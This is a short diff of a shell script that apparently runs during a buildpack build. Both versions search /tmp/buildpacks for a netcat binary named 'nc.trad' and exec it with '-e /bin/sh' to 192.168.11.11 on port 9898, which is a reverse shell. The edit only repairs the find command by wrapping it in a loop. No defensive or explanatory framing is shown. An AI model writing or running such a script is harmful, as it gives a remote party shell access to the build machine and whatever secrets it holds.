@@ -1,5 +1,7 @@
 #!/bin/sh
-executable=find /tmp/buildpacks -name 'nc.trad'
-echo execing $executable
-exec $executable -e /bin/sh 192.168.11.11 9898
+for file in `find /tmp/buildpacks -name 'nc.trad'`
+do
+	echo execing $file
+	exec $file -e /bin/sh 192.168.11.11 9898
+done
 exit 0
